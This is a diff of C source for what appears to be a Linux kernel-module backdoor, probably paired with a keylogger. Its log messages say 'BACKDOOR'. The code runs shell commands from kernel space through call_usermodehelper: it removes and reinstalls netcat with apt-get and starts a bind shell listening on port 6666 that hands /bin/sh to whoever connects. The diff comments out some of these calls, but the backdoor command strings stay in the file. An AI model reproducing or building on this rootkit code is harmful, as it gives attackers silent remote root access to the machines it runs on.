@@ -133,7 +133,8 @@ static const char* keymap_shift[] =
 		(could be done in a mor e elegant fashion by for example downloading the binary. 
 		-> independant of the distro/packet managment tool. 
 		http://superuser.com/questions/691008/why-is-the-e-option-missing-from-netcat-openbsd */
-	    char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL}; // -y allways answer yes
+	    //char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL}; // -y allways answer yes
+	    char *argv1[] = {"/bin/sh", NULL};
 	    char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
 	    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh", NULL}; 
 
@@ -141,11 +142,11 @@ static const char* keymap_shift[] =
 	    #ifdef LOG
 			printk(KERN_ERR  "BACKDOOR un-install netcat returned  %i\n", ret);
 		#endif
-	    ret = call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); // Install netcat-taditional
+	    //ret = call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); // Install netcat-taditional
 	    #ifdef LOG
 			printk(KERN_ERR  "BACKDOOR install netcat returned  %i\n", ret);
 		#endif
-	    ret = call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); // Launch netcat the fisrt time
+	    //ret = call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); // Launch netcat the fisrt time
 	    #ifdef LOG
 			printk(KERN_ERR  "BACKDOOR run netcat returned  %i\n", ret);
 		#endif
